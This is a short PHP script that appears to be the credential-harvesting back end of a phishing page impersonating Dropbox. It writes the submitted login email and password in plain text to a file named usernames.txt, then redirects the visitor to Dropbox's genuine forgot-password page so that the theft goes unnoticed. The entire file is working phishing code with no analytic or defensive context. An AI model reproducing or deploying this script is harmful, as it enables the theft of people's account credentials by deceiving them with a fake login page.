<?php

file_put_contents("usernames.txt", "Account: " . $_POST['login_email'] . "\nPass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.dropbox.com/forgot/');
exit();
